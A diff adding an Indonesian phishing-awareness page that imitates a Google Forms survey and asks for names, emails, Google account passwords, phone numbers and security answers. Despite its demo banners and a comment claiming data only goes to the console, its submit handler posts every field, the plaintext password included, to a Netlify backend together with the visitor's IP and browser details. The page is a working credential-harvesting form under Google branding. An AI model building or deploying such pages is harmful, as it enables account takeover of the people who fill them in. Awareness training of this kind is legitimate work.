@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Forms - Survey Kepuasan Pengguna</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
+    <style>
+        /* CSS inline tambahan */
+        .security-alert {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 8px;
+            display: none;
+        }
+        .demo-mode {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: #dc3545;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 12px;
+            z-index: 1000;
+        }
+    </style>
+</head>
+<body>
+    <!-- Banner DEMO -->
+    <div class="demo-mode">⚠️ DEMO EDUKASIONAL</div>
+    
+    <div class="container">
+        <!-- Header mirip Google Form -->
+        <div class="form-header">
+            <div class="google-header">
+                <div class="google-logo">
+                    <span class="g-blue">G</span>
+                    <span class="o-red">o</span>
+                    <span class="o-yellow">o</span>
+                    <span class="g-blue">g</span>
+                    <span class="l-green">l</span>
+                    <span class="o-red">e</span>
+                </div>
+                <span class="forms-text">Forms</span>
+            </div>
+            
+            <div class="form-title-area">
+                <h1 class="form-title">Survey Kepuasan Layanan Google 2024</h1>
+                <p class="form-description">
+                    Terima kasih telah menggunakan layanan Google. Survei ini bertujuan untuk meningkatkan kualitas layanan kami.
+                    <br><br>
+                    <strong style="color: #d93025;">⚠️ PERINGATAN DEMO:</strong> Ini adalah simulasi phishing form. Data yang Anda masukkan TIDAK dikirim ke Google.
+                </p>
+            </div>
+        </div>
+
+        <!-- Security Alert (akan muncul jika mencoba submit) -->
+        <div class="security-alert" id="securityAlert">
+            <h3>🔒 PELAJARAN KEAMANAN:</h3>
+            <p>Jika ini phishing NYATA, data Anda sudah dicuri! Penyerang bisa dapat:</p>
+            <ul>
+                <li>Nama lengkap & email Anda</li>
+                <li>Password (jika Anda masukkan)</li>
+                <li>Data pribadi sensitif</li>
+                <li>Akses ke akun Google jika password sama</li>
+            </ul>
+            <p><strong>Tips Aman:</strong> Selalu periksa URL sebelum mengisi form!</p>
+        </div>
+
+        <!-- Form Area -->
+        <form id="phishingForm" class="form-body">
+            <!-- Section 1: Data Pribadi (Target utama phisher) -->
+            <div class="form-section">
+                <h2 class="section-title">Informasi Pribadi</h2>
+                <p class="section-description">Data ini diperlukan untuk verifikasi akun</p>
+                
+                <div class="form-group">
+                    <label for="fullName">Nama Lengkap *</label>
+                    <input type="text" id="fullName" name="fullName" 
+                           placeholder="Masukkan nama lengkap" 
+                           class="google-input" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="email">Alamat Email *</label>
+                    <input type="email" id="email" name="email" 
+                           placeholder="email@contoh.com" 
+                           class="google-input" required>
+                    <small class="hint">Gunakan email Google Anda</small>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password Akun Google *</label>
+                    <div class="password-container">
+                        <input type="password" id="password" name="password" 
+                               placeholder="Masukkan password" 
+                               class="google-input" 
+                               data-demo-value="********">
+                        <button type="button" class="show-password" onclick="togglePassword()">👁️</button>
+                    </div>
+                    <small class="hint danger">⚠️ PERINGATAN: Google TIDAK PERNAH minta password via form!</small>
+                </div>
+            </div>
+
+            <!-- Section 2: Data Keamanan (Tambahan untuk phisher) -->
+            <div class="form-section">
+                <h2 class="section-title">Pertanyaan Keamanan</h2>
+                <p class="section-description">Untuk verifikasi tambahan</p>
+                
+                <div class="form-group">
+                    <label for="birthDate">Tanggal Lahir</label>
+                    <input type="date" id="birthDate" name="birthDate" class="google-input">
+                </div>
+                
+                <div class="form-group">
+                    <label>Nomor Telepon</label>
+                    <input type="tel" name="phone" placeholder="0812-3456-7890" class="google-input">
+                </div>
+                
+                <div class="form-group">
+                    <label for="securityQuestion">Pertanyaan Keamanan Favorit</label>
+                    <select id="securityQuestion" name="securityQuestion" class="google-select">
+                        <option value="">Pilih pertanyaan...</option>
+                        <option value="mother">Nama gadis ibu kandung?</option>
+                        <option value="pet">Nama hewan peliharaan pertama?</option>
+                        <option value="school">Sekolah dasar pertama?</option>
+                        <option value="city">Kota kelahiran?</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="securityAnswer">Jawaban</label>
+                    <input type="text" id="securityAnswer" name="securityAnswer" 
+                           class="google-input" placeholder="Jawaban pertanyaan keamanan">
+                </div>
+            </div>
+
+            <!-- Section 3: Survey (untuk membuat tampilan legit) -->
+            <div class="form-section">
+                <h2 class="section-title">Survey Kepuasan</h2>
+                
+                <div class="form-group">
+                    <label>Seberapa puas Anda dengan layanan Google?</label>
+                    <div class="radio-group">
+                        <label class="radio-option">
+                            <input type="radio" name="satisfaction" value="5">
+                            <span>Sangat Puas</span>
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="satisfaction" value="4">
+                            <span>Puas</span>
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="satisfaction" value="3">
+                            <span>Cukup</span>
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="satisfaction" value="2">
+                            <span>Tidak Puas</span>
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="satisfaction" value="1">
+                            <span>Sangat Tidak Puas</span>
+                        </label>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="feedback">Kritik dan Saran</label>
+                    <textarea id="feedback" name="feedback" 
+                              class="google-textarea" 
+                              placeholder="Masukkan saran Anda..." 
+                              rows="4"></textarea>
+                </div>
+            </div>
+
+            <!-- Submit Area -->
+            <div class="form-footer">
+                <div class="submit-info">
+                    <p>Form ini dibuat oleh <strong>Google LLC</strong> • Tidak resmi</p>
+                    <p class="small-text">⚠️ Ini hanyalah demo edukasional</p>
+                </div>
+                
+                <div class="submit-buttons">
+                    <button type="button" class="clear-btn" onclick="clearForm()">
+                        Hapus Form
+                    </button>
+                    <button type="submit" class="submit-btn">
+                        <span class="submit-icon">✓</span>
+                        Kirim
+                    </button>
+                </div>
+            </div>
+        </form>
+
+        <!-- Data Preview (untuk demo) -->
+        <div class="data-preview" id="dataPreview">
+            <h3>📊 Data yang Akan Dikirim (DEMO):</h3>
+            <pre id="previewContent">Isi form untuk melihat preview...</pre>
+            <div class="demo-controls">
+                <button onclick="fillDemoData()" class="demo-btn">Isi Data Demo</button>
+                <button onclick="showRealPhishingExample()" class="demo-btn danger">Tampilkan Contoh Phishing Nyata</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal untuk edukasi -->
+    <div class="modal" id="educationModal">
+        <div class="modal-content">
+            <h2>🎓 PELAJARAN PHISHING FORM</h2>
+            <div class="modal-body">
+                <h3>Cara Membedakan Form Asli vs Phishing:</h3>
+                
+                <div class="comparison">
+                    <div class="real">
+                        <h4>✅ FORM ASLI:</h4>
+                        <ul>
+                            <li>URL: <code>https://docs.google.com/forms/...</code></li>
+                            <li>Domain: <code>google.com</code></li>
+                            <li>Tidak minta password</li>
+                            <li>Ada padlock (🔒) HTTPS</li>
+                            <li>Logo & branding konsisten</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="fake">
+                        <h4>❌ FORM PHISHING:</h4>
+                        <ul>
+                            <li>URL aneh: <code>google-form-verify.com</code></li>
+                            <li>Domain: <code>.tk, .xyz, .ml</code> atau mirip</li>
+                            <li>Minta data sensitif (password, PIN)</li>
+                            <li>Desain sedikit berbeda</li>
+                            <li>Dikirim via email/chat tak dikenal</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="tips">
+                    <h4>💡 Tips Aman:</h4>
+                    <ol>
+                        <li><strong>Periksa URL</strong> - pastikan domain resmi</li>
+                        <li><strong>Google tidak minta password</strong> via form</li>
+                        <li><strong>Hover link</strong> sebelum klik - lihat URL asli</li>
+                        <li><strong>Gunakan 2FA</strong> (Two-Factor Authentication)</li>
+                        <li><strong>Laporkan</strong> jika menemukan phishing</li>
+                    </ol>
+                </div>
+                
+                <div class="modal-footer">
+                    <button onclick="closeModal()" class="modal-btn">Tutup</button>
+                    <button onclick="testRealGoogleForm()" class="modal-btn primary">
+                        Coba Form Google Asli
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // BASE URL untuk Netlify Functions
+        const API_BASE = '/.netlify/functions/';
+        
+        // Data demo otomatis
+        const demoData = {
+            fullName: "Andi Wijaya",
+            email: "andi.contoh@gmail.com",
+            password: "Password123!",
+            birthDate: "1990-05-15",
+            phone: "081234567890",
+            securityQuestion: "mother",
+            securityAnswer: "Siti",
+            satisfaction: "5",
+            feedback: "Layanan sangat bagus, tapi perlu improvement di..."
+        };
+
+        // Update preview saat form berubah
+        document.querySelectorAll('.google-input, .google-textarea, .google-select, input[type="radio"]')
+            .forEach(element => {
+                element.addEventListener('input', updatePreview);
+                element.addEventListener('change', updatePreview);
+            });
+
+        function updatePreview() {
+            const formData = new FormData(document.getElementById('phishingForm'));
+            const data = {};
+            
+            formData.forEach((value, key) => {
+                data[key] = value;
+            });
+            
+            // Jangan tampilkan password asli di preview
+            if (data.password && data.password !== '********') {
+                data.password = '******** (DEMO: ' + data.password + ')';
+            }
+            
+            document.getElementById('previewContent').textContent = 
+                JSON.stringify(data, null, 2);
+        }
+
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            const type = passwordField.type === 'password' ? 'text' : 'password';
+            passwordField.type = type;
+        }
+
+        function fillDemoData() {
+            Object.keys(demoData).forEach(key => {
+                const element = document.querySelector(`[name="${key}"]`);
+                if (element) {
+                    if (element.type === 'radio') {
+                        document.querySelector(`[name="${key}"][value="${demoData[key]}"]`).checked = true;
+                    } else {
+                        element.value = demoData[key];
+                    }
+                }
+            });
+            updatePreview();
+            alert('✅ Data demo diisi. Ini contoh data yang biasa dicuri phisher!');
+        }
+
+        function clearForm() {
+            if (confirm('Hapus semua data form?')) {
+                document.getElementById('phishingForm').reset();
+                updatePreview();
+            }
+        }
+
+        // Handle form submission
+        document.getElementById('phishingForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Kumpulkan data form
+            const formData = new FormData(this);
+            const data = {};
+            formData.forEach((value, key) => {
+                data[key] = value;
+            });
+            
+            // Tampilkan security alert
+            document.getElementById('securityAlert').style.display = 'block';
+            
+            // Scroll ke alert
+            document.getElementById('securityAlert').scrollIntoView({ behavior: 'smooth' });
+            
+            // Tampilkan modal edukasi
+            setTimeout(() => {
+                document.getElementById('educationModal').style.display = 'block';
+            }, 1000);
+            
+            // Dalam phishing NYATA, data dikirim ke server hacker
+            // Tapi di demo ini, kita hanya log ke console
+            console.log('📨 [DEMO PHISHING] Data yang bisa dicuri:', data);
+            
+            // Demo: Kirim ke Netlify Function (untuk edukasi)
+            try {
+                const response = await fetch(API_BASE + 'submit-form', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ...data,
+                        isDemo: true,
+                        ip: await getIP(),
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+                
+                const result = await response.json();
+                console.log('Server response:', result);
+                
+            } catch (error) {
+                console.log('Demo submission error:', error);
+            }
+            
+            return false;
+        });
+
+        function showRealPhishingExample() {
+            const examples = [
+                {
+                    url: "https://google-verify-account.xyz/form",
+                    data: {
+                        email: "korban@gmail.com",
+                        password: "rahasia123",
+                        creditCard: "4111-1111-1111-1111"
+                    },
+                    result: "Akun dibobol, uang dicuri"
+                },
+                {
+                    url: "https://facebook-login.security-check.tk",
+                    data: {
+                        username: "john_doe",
+                        password: "facebookpass",
+                        phone: "08123456789"
+                    },
+                    result: "Akun dijual di dark web"
+                }
+            ];
+            
+            const example = examples[Math.floor(Math.random() * examples.length)];
+            
+            alert(`🌐 CONTOH PHISHING NYATA:\n\nURL: ${example.url}\n\nData yang dicuri:\n${JSON.stringify(example.data, null, 2)}\n\nHasil: ${example.result}\n\n💡 SELALU CEK URL SEBELUM MENGISI!`);
+        }
+
+        function closeModal() {
+            document.getElementById('educationModal').style.display = 'none';
+        }
+
+        function testRealGoogleForm() {
+            window.open('https://docs.google.com/forms/d/e/1FAIpQLSe6fDZ4FpJjLJY6p7vM8kL0KpQrYt7vWjzH5q3l6m5n4o3b2c1/viewform', '_blank');
+        }
+
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Tidak terdeteksi (demo)';
+            }
+        }
+
+        // Inisialisasi preview
+        updatePreview();
+        
+        // Auto-show modal pertama kali
+        setTimeout(() => {
+            if (!localStorage.getItem('phishingDemoSeen')) {
+                document.getElementById('educationModal').style.display = 'block';
+                localStorage.setItem('phishingDemoSeen', 'true');
+            }
+        }, 2000);
+    </script>
+</body>
+</html>
